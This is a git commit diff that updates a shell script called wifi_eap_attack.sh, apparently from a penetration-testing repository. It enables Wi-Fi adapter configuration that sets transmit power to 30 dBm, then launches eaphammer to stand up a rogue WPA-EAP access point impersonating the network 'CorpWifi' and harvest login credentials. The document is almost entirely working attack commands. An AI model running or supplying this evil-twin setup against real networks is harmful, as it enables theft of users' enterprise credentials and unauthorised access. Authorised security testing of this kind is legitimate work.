ab8f35cbe6ea566e1bf17f72a19dcf5545b7f7ec
sirchsec <85844648+sirchsec@users.noreply.github.com>
2021-10-12 10:46:05 -0400

    Update wifi_eap_attack.sh

--- wifi_eap_attack.sh
+++ wifi_eap_attack.sh
@@ -12,11 +12,11 @@ else
         exit 1
 fi
 
-#echo "Configuring wifi adapter"
-#sudo ip link set $interface down
-#sudo iw $interface set txpower fixed 3000
-#sudo iw dev $interface set type monitor
-#sudo ip link set $interface up
+echo "Configuring wifi adapter"
+sudo ip link set $interface down
+sudo iw $interface set txpower fixed 3000
+sudo iw dev $interface set type managed
+sudo ip link set $interface up
 
 cd /opt/eaphammer
 /opt/eaphammer/eaphammer -i $interface --channel 4 --auth wpa-eap --essid CorpWifi --creds
